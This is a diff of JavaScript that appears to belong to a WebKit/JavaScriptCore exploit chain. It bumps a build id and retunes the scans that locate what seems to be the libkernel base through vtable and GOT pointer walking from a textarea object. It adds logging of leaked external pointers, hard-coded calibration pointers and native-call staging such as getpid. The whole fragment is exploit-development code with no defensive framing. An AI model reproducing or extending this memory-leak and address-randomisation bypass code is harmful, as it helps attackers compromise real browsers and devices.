@@ -51,7 +51,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831g";
+const BUILD_ID = "rw-20250831h";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -471,25 +471,20 @@ const FIND_LK_LITE = {
     lite: true,
     safeOnly: true,
     maxWalkPages: 0,
-    knownMax: 2,
+    knownMax: 7,
+    knownWalkPages: 16,
     knownBatch: 1,
     vtableEntries: 16,
 };
 const FIND_LK_NORM = {
     label: "norm",
     lite: false,
-    safeOnly: false,
-    maxWalkPages: 24,
+    safeOnly: true,
+    maxWalkPages: 0,
     knownMax: 7,
+    knownWalkPages: 24,
     knownBatch: 1,
     vtableEntries: 32,
-    absSpan: 0x4000,
-    absBatch: 8,
-    nearRadius: 0x200000,
-    maxPages: 32,
-    hdrCoarse: 16,
-    hdrFine: 0,
-    relroBatch: 8,
 };
 
 function parseCalPtr(raw) {
@@ -2043,11 +2038,22 @@ function finishFindLkChunk(chunk) {
             + " belowPages=" + (chunk.belowPages != null ? chunk.belowPages : 0)
             + (chunk.vtable ? " vt=" + chunk.vtable : " vt=none"));
         mark("LK-GOT-MISS", (chunk.error || chunk.phase || "miss") + " build=" + BUILD_ID);
-        mark("LK-HINT", chunk.cells === 0
-            ? "no textarea cell — re-run Start"
-            : (chunk.vtCount === 0
-                ? "no vtable chain — try cal index for CELL-SCAN lines"
-                : "ext ptrs found but no lk base — paste ext to hex + Verify lk"));
+        if (chunk.known > 0 && chunk.vtExt === 0 && chunk.cells === 0) {
+            mark("LK-HINT", "known=" + chunk.known
+                + " = hardcoded cal ptrs (not live vtable) — need cells>0 for vt-ready");
+        } else {
+            mark("LK-HINT", chunk.cells === 0
+                ? "no textarea cell — re-run Start (31h adds expm1/fresh.ta fallback)"
+                : (chunk.vtCount === 0
+                    ? "no vtable chain — try cal index for CELL-SCAN lines"
+                    : "ext ptrs found but no lk base — paste LK-EXT to hex + Verify lk"));
+        }
+        if (chunk.extList && chunk.extList.length) {
+            for (let ei = 0; ei < chunk.extList.length; ei++)
+                mark("LK-EXT", (chunk.extList[ei].vt || "?")
+                    + "[" + (chunk.extList[ei].idx != null ? chunk.extList[ei].idx : "?") + "] → "
+                    + chunk.extList[ei].ptr);
+        }
         state("Scan GOT miss — see LK-GOT-TRACE", "bad");
         crashLog.flushSync();
         return true;
@@ -2102,8 +2108,12 @@ async function runFindLkAuto(preset) {
                 mark("LK-GOT", "lite=safe-only known+vtable (no blind scan) build=" + BUILD_ID);
             else if (chunk.phase === "known-start")
                 mark("LK-GOT", "known ext ptrs n=" + chunk.n);
-            else if (chunk.phase === "known-done")
+            else if (chunk.phase === "known-done") {
                 mark("LK-GOT", "known miss tried=" + (chunk.tried || 0) + " — vtable scan");
+                const kp = knownExtPtrsForLk().slice(0, chunk.tried || 7);
+                for (let ki = 0; ki < kp.length; ki++)
+                    mark("LK-KNOWN", kp[ki] + " miss (k__error+walk)");
+            }
             else if (chunk.phase === "vt-ready")
                 mark("LK-GOT", "vtable " + chunk.vtable
                     + " n=" + (chunk.vtCount || 1) + " cells=" + (chunk.cells || "?")
